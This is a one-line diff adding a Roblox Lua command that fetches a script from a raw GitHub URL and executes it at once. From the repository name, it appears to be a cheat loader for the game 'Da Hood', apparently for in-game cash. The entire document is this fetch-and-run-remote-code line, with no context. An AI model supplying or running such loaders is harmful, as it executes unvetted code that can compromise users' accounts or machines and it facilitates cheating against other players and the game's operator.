@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/shirooscripts/da-hood-cash/main/ug"))()
